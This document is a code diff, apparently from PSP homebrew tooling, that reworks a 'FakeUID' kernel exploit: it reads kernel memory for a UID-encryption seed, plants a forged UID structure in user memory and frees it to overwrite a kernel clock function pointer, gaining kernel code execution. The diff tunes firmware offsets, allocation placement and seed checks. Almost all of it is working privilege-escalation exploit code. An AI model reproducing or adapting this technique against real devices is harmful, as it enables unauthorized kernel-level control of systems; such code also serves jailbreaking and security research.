@@ -30,6 +30,8 @@ Put together by Acid_Snake and meetpatty.
 #define LIBC_CLOCK_OFFSET_360  0x88014D80
 #define LIBC_CLOCK_OFFSET_365  0x88014D00
 #define SYSMEM_SEED_OFFSET_365 0x88014E38
+#define SYSMEM_SEED_OFFSET_CHECK SYSMEM_TEXT+0x00002FA8
+
 #define FAKE_UID_OFFSET        0x80
 
 UserFunctions* g_tbl;
@@ -41,7 +43,7 @@ int (*_sceNpCore_8AFAB4A0)(int *input, char *string, int length);
 static volatile int running;
 static volatile int idx;
 static int input[3];
-static int libc_clock_offset = LIBC_CLOCK_OFFSET_365;
+static int libc_clock_offset = LIBC_CLOCK_OFFSET_360;
 
 static int racer(SceSize args, void *argp) {
   running = 1;
@@ -95,21 +97,28 @@ void repairInstruction(KernelFunctions* k_tbl) {
 }
 
 int stubScanner(UserFunctions* tbl){
+    int res = 0;
     g_tbl = tbl;
-    
-    if (g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON) < 0)
-        return -1;
+    tbl->freeMem(tbl);
 
-    if (g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON) < 0)
-        return -2;
-
-    if (g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET) < 0)
-        return -3;
-    
+    g_tbl->UtilityLoadModule(PSP_MODULE_NP_COMMON);
+    g_tbl->UtilityLoadModule(PSP_MODULE_NET_COMMON);
+    g_tbl->UtilityLoadModule(PSP_MODULE_NET_INET);
     _sceNpCore_8AFAB4A0 = tbl->FindImportUserRam("sceNpCore", 0x8AFAB4A0);
-    if (_sceNpCore_8AFAB4A0 == NULL) return -4;
-    
+
     return 0;
+}
+
+int checkPlantUID(int uid){
+  u32 addr = 0x88000000 + ((uid >> 5) & ~3);
+  u32 data = readKram(addr);
+  return (data == libc_clock_offset - 4);
+}
+
+void dumpBuf(char* path, void* buf, int size){
+  int fd = g_tbl->IoOpen(path, PSP_O_WRONLY|PSP_O_CREAT|PSP_O_TRUNC, 0777);
+  g_tbl->IoWrite(fd, buf, size);
+  g_tbl->IoClose(fd);
 }
 
 /*
@@ -119,42 +128,58 @@ FakeUID kxploit
 int doExploit(void) {
 
     int res;
+    u32 seed = 0;
 
-    u32 seed = readKram(SYSMEM_SEED_OFFSET_365);
-    if (!seed)
-      libc_clock_offset = LIBC_CLOCK_OFFSET_360;
-    else
-      PRTSTR1("Seed: %p", seed);
+    if (_sceNpCore_8AFAB4A0 != NULL){
+      u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
+      if (test_val == 0x8F154E38){
+        seed = readKram(SYSMEM_SEED_OFFSET_365);
+        libc_clock_offset = LIBC_CLOCK_OFFSET_365;
+      }
+    }
 
     // Allocate dummy block to improve reliability
     char dummy[32];
     memset(dummy, 'a', sizeof(dummy));
-    SceUID dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_Low, 0x10, NULL);
+    SceUID dummyid;
+    for (int i=0; i<10; i++)
+      dummyid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_High, 0x10, NULL);
 
     // we can calculate the address of dummy block via its UID and from there calculate where the next block will be
     u32 dummyaddr = 0x88000000 + ((dummyid >> 5) & ~3);
-    SceUID uid = ((((dummyaddr - FAKE_UID_OFFSET) & 0x00ffffff) >> 2) << 7) | 0x1;
+    u32 newaddr = dummyaddr - FAKE_UID_OFFSET;
+    SceUID uid = (((newaddr & 0x00ffffff) >> 2) << 7) | 0x1;
     SceUID encrypted_uid = uid ^ seed; // encrypt UID, if there's none then A^0=A
 
     // Plant UID data structure into kernel as string
     u32 string[] = { libc_clock_offset - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
-    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)&string, PSP_SMEM_Low, 0x10, NULL);
+    SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_High, 0x10, NULL);
 
     g_tbl->KernelDcacheWritebackAll();
+
+    //dumpBuf("ms0:/dummyaddr.bin", &dummyaddr, sizeof(dummyaddr));
+    //dumpBuf("ms0:/newaddr.bin", &newaddr, sizeof(newaddr));
 
     // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
     res = g_tbl->KernelFreePartitionMemory(uid);
 
-    g_tbl->KernelFreePartitionMemory(plantid);
-    g_tbl->KernelFreePartitionMemory(dummyid);
+    g_tbl->KernelDcacheWritebackAll();
 
-    g_tbl->UtilityUnloadModule(PSP_MODULE_NET_INET);
-    g_tbl->UtilityUnloadModule(PSP_MODULE_NET_COMMON);
-    g_tbl->UtilityUnloadModule(PSP_MODULE_NP_COMMON);
+    /*
+    int (*CtrlReadBufferPositive)(SceCtrlData *, int) = NULL;
+    CtrlReadBufferPositive = g_tbl->FindImportUserRam("sceCtrl", 0x1F803938);
+    u32 EXIT_MASK = (PSP_CTRL_START | PSP_CTRL_UP);
+    while (1){
+      SceCtrlData pad_data;
+  	  CtrlReadBufferPositive(&pad_data, 1);
+      if((pad_data.Buttons & EXIT_MASK) == EXIT_MASK){
+        break;
+      }
+    }
+    */
+   
+    if (res < 0) return res;
 
-    if (res < 0)
-        return res;
-        
     return 0;
 }
 
@@ -167,4 +192,3 @@ void executeKernel(u32 kernelContentFunction){
   // Execute kernel function
   g_tbl->KernelLibcClock();
 }
-
